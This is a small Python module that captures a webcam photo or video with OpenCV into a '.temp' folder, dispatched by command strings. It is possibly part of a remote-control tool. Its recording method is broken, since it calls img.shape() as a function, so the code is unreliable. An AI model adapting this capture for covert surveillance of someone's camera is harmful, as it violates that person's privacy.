import cv2 
import os


class Webcam():
    def __init__(self):
        pass

    def run(self, code, time=10):
        if code == "image":
            return self.screenshot()
        elif code == "video":
            return self.record(time)
         
        return False

    def screenshot(self):
        try:
            cam = cv2.VideoCapture(0)
            _, img = cam.read()

            path = os.path.join('.temp', 'webcam.png')

            cv2.imwrite(path, img)

            cam.release()

            return True
        
        except OSError:
            return False

    def record(self, time):
        try:
            fourcc = cv2.VideoWriter_fourcc('m', 'p', '4', 'v')
            fps = 20
            cam = cv2.VideoCapture(0)

            path = os.path.join('.temp', 'webcam-record.avi')

            _, img = cam.read()
            height, width, _ = img.shape()
            out = cv2.VideoWriter(path, fourcc, fps, (width, height))

            for i in range(time*fps):
                _, img = cam.read()
                out.write(img)
                cv2.waitKey(1)

            cam.release()
            out.release()
        
            return True
        
        except OSError:
            return False
